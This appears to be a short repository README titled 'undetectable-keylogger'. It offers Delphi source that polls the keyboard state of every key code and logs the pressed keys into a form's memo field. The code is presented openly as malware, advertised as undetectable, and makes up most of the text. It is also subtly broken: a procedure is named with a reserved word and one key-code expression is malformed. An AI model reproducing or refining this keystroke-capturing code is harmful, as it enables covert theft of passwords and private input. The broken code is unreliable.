undetectable-keylogger
======================
Labels
keylogger, delphi, pascal, borland, jamesjara

undetectable keylogger for delphi

Source of a simple keylogger in delphi


```pascal

procedure TForm1.procedure();
var X,y:integer;
f:char  ;
str:string;
begin
//todas las teclas
For X:=0 to 255 do
begin
  if ((GetAsyncKeyState($+x) and 1) = 1) then
  begin
  if (x<>1) then //if we want to find the ascii code instead:
  begin
  //MEMO1.Lines.Add(inttostr(x)+'$·%&');
  end;
    for y:=0 to listview1.items.Count-1 do //log the key strokes
      begin
       if x=strtoint(listview1.items.item[y].caption) then
       memo1.text:=memo1.Text + (listview1.items.item[y].subitems[0])
     end;
   end;
end;
end;

```
